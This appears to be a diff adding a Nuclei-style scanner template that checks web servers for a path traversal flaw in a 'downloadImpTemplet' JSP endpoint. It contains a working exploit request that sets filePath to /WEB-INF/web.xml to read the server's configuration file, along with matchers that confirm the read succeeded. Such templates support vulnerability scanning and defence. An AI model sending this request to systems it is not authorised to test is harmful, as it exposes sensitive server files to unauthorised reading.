@@ -1,0 +1,26 @@
+id: Dep-downloadImpTemplet-pathTravel
+
+info:
+  name: Dep-downloadImpTemplet-pathTravel
+  author: iSee857
+  severity: high
+  description: |
+    Dep-downloadImpTemplet-pathTravel
+
+http:
+  - raw:
+      - |
+        GET /common/dep/common_dep.action.jsp?action=downloadImpTemplet&filePath=/WEB-INF/web.xml&fileName=12 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '<filter-name'
+          - 'display-name>'
+        condition: and
+
+      - type: status
+        status:
+          - 200
